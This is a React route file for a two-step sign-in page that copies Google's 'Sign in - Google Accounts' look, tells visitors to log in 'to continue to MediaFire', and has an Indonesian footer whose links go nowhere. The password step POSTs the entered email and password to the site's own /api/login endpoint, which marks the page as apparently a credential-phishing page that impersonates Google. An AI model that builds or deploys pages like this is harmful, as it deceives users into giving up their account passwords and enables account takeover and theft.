import { createFileRoute, Link, useNavigate } from "@tanstack/react-router";
import { Check, CircleUserRound, Eye, EyeOff } from "lucide-react";
import { useEffect, useId, useRef, useState, type FormEvent, type ReactNode } from "react";

import { cn } from "@/lib/utils";

export const Route = createFileRoute("/auth/google")({
  head: () => ({
    meta: [
      { title: "Sign in - Google Accounts" },
      {
        name: "description",
        content: "Sign in to continue to MediaFire",
      },
      { property: "og:title", content: "Sign in - Google Accounts" },
      {
        property: "og:description",
        content: "Sign in to continue to MediaFire",
      },
      { property: "og:type", content: "website" },
      { name: "twitter:card", content: "summary" },
    ],
  }),
  component: GoogleAuth,
});

const link = "font-medium text-g-link hover:text-g-text";

function OutlinedField({
  label,
  value,
  onChange,
  type = "text",
  placeholder,
  invalid,
  inputMode,
  autoFocus,
}: {
  label: string;
  value: string;
  onChange: (v: string) => void;
  type?: string;
  placeholder?: string;
  invalid?: boolean;
  inputMode?: "email" | "text";
  autoFocus?: boolean;
}) {
  const id = useId();
  return (
    <div className="relative">
      <input
        id={id}
        type={type}
        inputMode={inputMode}
        autoFocus={autoFocus}
        autoComplete="email"
        autoCapitalize="off"
        spellCheck={false}
        placeholder={placeholder}
        value={value}
        onChange={(e) => onChange(e.target.value)}
        className={cn(
          "peer block h-[56px] w-full rounded-[4px] border bg-transparent px-[15px] text-[16px] text-g-text outline-none transition-colors placeholder:text-g-soft/50 focus:border-2 focus:px-[14px]",
          invalid ? "border-g-error focus:border-g-error" : "border-g-border focus:border-g-link",
        )}
      />
      <label
        htmlFor={id}
        className={cn(
          "absolute -top-[9px] left-[11px] bg-g-bg px-[4px] text-[12px]",
          invalid ? "text-g-error" : "text-g-soft peer-focus:text-g-link",
        )}
      >
        {label}
      </label>
    </div>
  );
}

function Shell({ children }: { children: ReactNode }) {
  return (
    <div className="flex min-h-screen flex-col bg-g-bg font-gsans text-g-text">
      <main className="mx-auto w-full max-w-[460px] flex-1 px-6 pt-[21px]">
        <img
          src="/assets/mediafire-icon-white.svg"
          alt="MediaFire icon"
          className="size-[48px]"
        />
        {children}
      </main>
      <footer className="mx-auto flex w-full max-w-[460px] flex-wrap items-center justify-between gap-y-2 px-6 py-[24px] text-[12px] text-g-text">
        <span className="flex items-center gap-2">
          Indonesia
          <svg viewBox="0 0 10 5" className="ml-[18px] h-[5px] w-[10px] fill-current" aria-hidden="true">
            <path d="M0 0h10L5 5z" />
          </svg>
        </span>
        <div className="flex gap-[33px]">
          <Link className="hover:text-g-link" to="#">Bantuan</Link>
          <Link className="hover:text-g-link" to="#">Privasi</Link>
          <Link className="hover:text-g-link" to="#">Persyaratan</Link>
        </div>
      </footer>
    </div>
  );
}

const nextBtn =
  "h-[41px] min-w-[120px] rounded-full bg-g-btn px-6 text-[15px] font-medium text-g-btn-text outline-none transition hover:bg-g-btn-hover focus-visible:ring-2 focus-visible:ring-g-link focus-visible:ring-offset-2 focus-visible:ring-offset-g-bg active:scale-[0.98]";

function GoogleAuth() {
  const navigate = useNavigate();
  const [step, setStep] = useState<1 | 2>(1);
  const [email, setEmail] = useState("");
  const [confirmedEmail, setConfirmedEmail] = useState("");
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const [isLoading, setIsLoading] = useState(false);
  const passwordFormRef = useRef<HTMLFormElement>(null);

  useEffect(() => {
    if (step === 2) passwordFormRef.current?.querySelector("input")?.focus();
  }, [step]);

  const submitEmail = async (e: FormEvent) => {
    e.preventDefault();
    
    if (!email.trim()) {
      setError("Email is required");
      return;
    }

    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    if (!emailRegex.test(email.trim())) {
      setError("Please enter a valid email address");
      return;
    }

    setError(null);
    setConfirmedEmail(email.trim());
    setStep(2);
  };

  const submitPassword = async (e: FormEvent) => {
    e.preventDefault();
    
    if (!password) {
      setError("Password is required");
      return;
    }

    if (password.length < 8) {
      setError("Password must be at least 8 characters long");
      return;
    }

    setIsLoading(true);
    
    try {
      const response = await fetch('/api/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          type: 'google',
          email: confirmedEmail,
          password: password
        })
      });

      const data = await response.json();

      if (data.success) {
        navigate({ to: data.redirect || '/success' });
      } else {
        setError(data.message || "Login failed");
      }
    } catch (error) {
      setError("An error occurred. Please try again.");
    } finally {
      setIsLoading(false);
    }
  };

  if (step === 1) {
    return (
      <Shell>
        <h1 className="mt-[27px] text-[32px] leading-tight">Login</h1>
        <p className="mt-[17px] text-[16px]">to continue to MediaFire</p>
        <form onSubmit={submitEmail} noValidate className="mt-[42px]">
          <OutlinedField
            label="Email or phone"
            type="email"
            inputMode="email"
            placeholder="Email or phone"
            autoFocus
            value={email}
            onChange={setEmail}
            invalid={!!error}
          />
          {error && (
            <p role="alert" className="mt-2 text-[12.5px] text-g-error">
              {error}
            </p>
          )}
          <Link className={cn(link, "mt-[9px] inline-block text-[15px]")} to="#">Forgot email?</Link>
          <div className="mt-[42px] flex items-center justify-between">
            <Link className={cn(link, "text-[15px]")} to="#">Create account</Link>
            <button type="submit" className={nextBtn}>
              Next
            </button>
          </div>
        </form>
      </Shell>
    );
  }

  return (
    <Shell>
      <h1 className="mt-[27px] text-[32px] leading-tight">Welcome</h1>
      <div className="mt-[17px] flex items-center gap-[10px] text-[15px] font-medium">
        <CircleUserRound className="size-[23px] shrink-0 text-g-soft" strokeWidth={1.6} />
        <span className="break-all">
          {confirmedEmail}
        </span>
      </div>

      <form ref={passwordFormRef} onSubmit={submitPassword} noValidate className="mt-[83px]">
        <OutlinedField
          label="Password"
          type={showPassword ? "text" : "password"}
          autoFocus
          autoComplete="current-password"
          value={password}
          onChange={setPassword}
          invalid={!!error}
        />
        {error && (
          <p role="alert" className="mt-2 text-[12.5px] text-g-error">
            {error}
          </p>
        )}
        <label className="mt-[10px] flex cursor-pointer items-center gap-[18px] text-[15px] font-medium">
          <input
            type="checkbox"
            checked={showPassword}
            onChange={(e) => setShowPassword(e.target.checked)}
            className="peer sr-only"
          />
          <span
            aria-hidden="true"
            className={cn(
              "ml-[2px] flex size-[20px] shrink-0 items-center justify-center rounded-[2px] border-2 transition-colors peer-focus-visible:ring-2 peer-focus-visible:ring-g-link/50",
              showPassword ? "border-g-link bg-g-link text-g-btn-text" : "border-g-soft",
            )}
          >
            {showPassword && <Check className="size-[15px]" strokeWidth={3.5} />}
          </span>
          Show password
        </label>
        <div className="mt-[42px] flex items-center justify-between">
          <Link className={cn(link, "text-[15px]")} to="#">Forgot password?</Link>
          <button type="submit" disabled={isLoading} className={nextBtn}>
            {isLoading ? "Signing in..." : "Next"}
          </button>
        </div>
      </form>
    </Shell>
  );
}
